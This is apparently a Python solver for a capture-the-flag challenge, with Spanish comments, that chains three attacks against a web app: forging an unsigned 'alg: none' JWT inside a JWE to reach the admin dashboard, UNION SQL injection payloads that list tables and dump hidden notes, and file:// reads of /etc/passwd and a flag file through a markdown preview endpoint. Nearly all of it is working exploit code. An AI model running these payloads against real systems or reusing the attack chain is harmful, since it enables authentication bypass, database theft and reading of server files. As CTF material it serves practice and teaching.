#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  PHANTOM CORP — CTF Challenge Solver                            ║
║  Método: UNION-based SQLi (rápido)                              ║
║                                                                  ║
║  Cadena de explotación:                                          ║
║  Stage 1: CVE-2026-29000 — JWT Auth Bypass (PlainJWT en JWE)    ║
║  Stage 2: CVE-2026-30881 — UNION SQLi (str_replace bypass)      ║
║  Stage 3: CVE-2026-23850 — SSRF/LFI (file:// en markdown)       ║
╚══════════════════════════════════════════════════════════════════╝
"""
import sys
import json
import time
import base64
import re
import requests
from jwcrypto import jwk, jwe

# ─── Configuración ───
TARGET = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:5000'
SESSION = requests.Session()


def banner():
    print("""
    ╔═══════════════════════════════════════════════╗
    ║   🔒 PHANTOM CORP — CTF Exploit Chain 🔒     ║
    ║   3 CVEs del 2026 · Categoría: Hard           ║
    ╚═══════════════════════════════════════════════╝
    """)


def b64url_encode(data):
    """Base64 URL-safe encode sin padding."""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


# ═══════════════════════════════════════════════════
#  STAGE 0: RECONOCIMIENTO
# ═══════════════════════════════════════════════════
def stage0_recon():
    print('\n' + '=' * 60)
    print('  STAGE 0: RECONOCIMIENTO')
    print('=' * 60)

    # robots.txt
    print('\n[*] Obteniendo robots.txt...')
    r = SESSION.get(f'{TARGET}/robots.txt')
    print(f'[+] Status: {r.status_code}')
    for line in r.text.strip().split('\n'):
        line = line.strip()
        if 'Disallow' in line or 'well-known' in line.lower() or 'jwks' in line.lower():
            print(f'    📌 {line}')

    # JWKS
    print('\n[*] Obteniendo /.well-known/jwks.json...')
    r = SESSION.get(f'{TARGET}/.well-known/jwks.json')
    jwks_data = r.json()
    print(f'[+] Status: {r.status_code}')
    print(f'[+] Claves públicas encontradas: {len(jwks_data["keys"])}')
    key = jwks_data['keys'][0]
    print(f'    → Tipo: {key["kty"]}, Algoritmo: {key["alg"]}, KID: {key["kid"]}')

    return jwks_data


# ═══════════════════════════════════════════════════
#  STAGE 1: CVE-2026-29000 — JWT Auth Bypass
# ═══════════════════════════════════════════════════
def stage1_jwt_bypass(jwks_data):
    print('\n' + '=' * 60)
    print('  STAGE 1: CVE-2026-29000 — JWT Auth Bypass')
    print('=' * 60)

    # Importar clave pública RSA del JWKS
    print('\n[*] Importando clave pública RSA desde JWKS...')
    key_data = jwks_data['keys'][0]
    pub_key = jwk.JWK(**key_data)
    print(f'[+] Clave RSA importada ({key_data["kid"]})')

    # Crear PlainJWT (sin firma, alg: none)
    print('[*] Forjando PlainJWT con claims de admin...')
    header = {'alg': 'none', 'typ': 'JWT'}
    now = int(time.time())
    claims = {
        'sub': 'phantom_admin',
        'role': 'admin',
        'iat': now,
        'exp': now + 86400,
        'iss': 'phantom-corp-auth'
    }
    plain_jwt = b64url_encode(json.dumps(header)) + '.' + b64url_encode(json.dumps(claims)) + '.'
    print(f'[+] PlainJWT: {plain_jwt[:60]}...')

    # Envolver en JWE con la clave pública
    print('[*] Envolviendo en JWE (RSA-OAEP-256 + A256GCM)...')
    jwe_header = {
        'alg': 'RSA-OAEP-256',
        'enc': 'A256GCM',
        'kid': key_data.get('kid', 'phantom-corp-key-1')
    }
    jwe_token = jwe.JWE(
        plain_jwt.encode('utf-8'),
        recipient=pub_key,
        protected=json.dumps(jwe_header)
    )
    forged_token = jwe_token.serialize(compact=True)
    print(f'[+] Token JWE forjado: {forged_token[:70]}...')

    # Usar token para acceder al admin
    print('\n[*] Accediendo al panel admin con token forjado...')
    SESSION.cookies.set('session_token', forged_token)
    r = SESSION.get(f'{TARGET}/admin/dashboard', allow_redirects=False)

    if r.status_code == 200 and ('Dashboard' in r.text or 'phantom_admin' in r.text):
        print(f'[+] ✅ ACCESO ADMIN CONCEDIDO (HTTP {r.status_code})')
        print(f'[+] Autenticados como: phantom_admin (role: admin)')
        return forged_token
    else:
        print(f'[-] ❌ Fallo: HTTP {r.status_code}')
        return None


# ═══════════════════════════════════════════════════
#  STAGE 2: CVE-2026-30881 — SQL Injection (UNION)
# ═══════════════════════════════════════════════════
def stage2_sqli_union():
    print('\n' + '=' * 60)
    print('  STAGE 2: CVE-2026-30881 — SQL Injection (UNION)')
    print('=' * 60)

    print('\n[*] La vulnerabilidad CVE-2026-30881 (Chamilo LMS):')
    print('    1. date_start/date_end se "sanitizan" con escape de comillas')
    print('    2. Luego str_replace() DESHACE el escape (\\\'  →  \')')
    print('    3. Los valores se inyectan en SQL sin parámetros')

    # Paso 1: Verificar SQLi con error-based
    print('\n[*] Verificando inyección SQL...')
    r = SESSION.get(f'{TARGET}/admin/api/stats', params={
        'date_start': '2026-01-01',
        'date_end': "' OR '1'='1"
    })
    if r.status_code == 200:
        print('[+] SQLi confirmada: query ejecutada con inyección')

    # Paso 2: Enumerar tablas con UNION
    print('\n[*] Enumerando tablas via UNION SELECT...')
    r = SESSION.get(f'{TARGET}/admin/api/stats', params={
        'date_start': '2026-01-01',
        'date_end': "' UNION SELECT 1, name FROM sqlite_master WHERE type='table' --"
    })
    data = r.json()
    tables = [item['action'] for item in data.get('data', []) if item.get('action')]
    print(f'[+] Tablas encontradas: {tables}')

    # Paso 3: Extraer notas ocultas
    print('\n[*] Extrayendo notas ocultas de secret_notes...')
    r = SESSION.get(f'{TARGET}/admin/api/stats', params={
        'date_start': '2026-01-01',
        'date_end': "' UNION SELECT 1, title || '|||' || content FROM secret_notes WHERE is_hidden=1 --"
    })
    data = r.json()

    secret_content = None
    for item in data.get('data', []):
        action = item.get('action', '')
        if action and '|||' in action:
            parts = action.split('|||', 1)
            title = parts[0]
            content = parts[1]
            print(f'\n[+] 📋 Nota oculta encontrada:')
            print(f'    Título: {title}')
            print(f'    ─────────────────────────────────────')
            # Mostrar las primeras líneas relevantes
            for line in content.split('\n'):
                line = line.strip()
                if line:
                    print(f'    {line}')
            print(f'    ─────────────────────────────────────')
            secret_content = content

    if secret_content:
        # Extraer pistas
        clues = []
        if 'file://' in secret_content:
            clues.append('Protocolo file:// soportado en source_url')
        if '/admin/notes/preview' in secret_content:
            clues.append('Endpoint vulnerable: /admin/notes/preview')
        if '/opt/phantom/flag.txt' in secret_content:
            clues.append('Ruta de la flag: /opt/phantom/flag.txt')
        if 'source_url' in secret_content:
            clues.append('Parámetro de inyección: source_url')

        print(f'\n[+] 🔍 Pistas extraídas:')
        for clue in clues:
            print(f'    → {clue}')
    else:
        print('[-] No se encontraron notas ocultas')

    return secret_content


# ═══════════════════════════════════════════════════
#  STAGE 3: CVE-2026-23850 — SSRF/LFI
# ═══════════════════════════════════════════════════
def stage3_ssrf_lfi():
    print('\n' + '=' * 60)
    print('  STAGE 3: CVE-2026-23850 — SSRF/LFI')
    print('=' * 60)

    print('\n[*] La vulnerabilidad CVE-2026-23850 (SiYuan):')
    print('    El markdown renderer acepta file:// URIs sin restricción')
    print('    → Lectura arbitraria de archivos del servidor')

    # Probar con /etc/passwd primero
    print('\n[*] Verificando LFI con /etc/passwd...')
    r = SESSION.post(f'{TARGET}/admin/notes/preview', data={
        'source_url': 'file:///etc/passwd',
        'content': ''
    })
    if 'root:' in r.text:
        print('[+] LFI confirmada — /etc/passwd leído correctamente')

    # Leer la flag
    print('\n[*] Leyendo flag: file:///opt/phantom/flag.txt')
    r = SESSION.post(f'{TARGET}/admin/notes/preview', data={
        'source_url': 'file:///opt/phantom/flag.txt',
        'content': ''
    })

    # Extraer flag del HTML
    match = re.search(r'flag\{[^}]+\}', r.text)
    flag = match.group(0) if match else None

    if flag:
        print(f'\n    ╔══════════════════════════════════════════════════════════╗')
        print(f'    ║                                                          ║')
        print(f'    ║   🏴 FLAG CAPTURADA:                                     ║')
        print(f'    ║   {flag:<53}║')
        print(f'    ║                                                          ║')
        print(f'    ╚══════════════════════════════════════════════════════════╝')
    else:
        print(f'[-] ❌ Flag no encontrada en la respuesta')

    return flag


# ═══════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════
def main():
    banner()
    print(f'[*] Target: {TARGET}')

    # Stage 0
    jwks_data = stage0_recon()

    # Stage 1: JWT bypass
    token = stage1_jwt_bypass(jwks_data)
    if not token:
        print('\n[-] ❌ Stage 1 falló. Abortando.')
        return 1

    # Stage 2: SQLi
    secret = stage2_sqli_union()

    # Stage 3: LFI
    flag = stage3_ssrf_lfi()

    # Resumen
    print('\n' + '═' * 60)
    print('  📊 RESUMEN DE EXPLOTACIÓN')
    print('═' * 60)
    print(f'  Stage 1 (CVE-2026-29000 JWT Bypass): ✅')
    print(f'  Stage 2 (CVE-2026-30881 SQLi):       {"✅" if secret else "❌"}')
    print(f'  Stage 3 (CVE-2026-23850 LFI):        {"✅" if flag else "❌"}')
    if flag:
        print(f'\n  🏆 FLAG: {flag}')
    print('═' * 60)

    return 0 if flag else 1


if __name__ == '__main__':
    sys.exit(main())
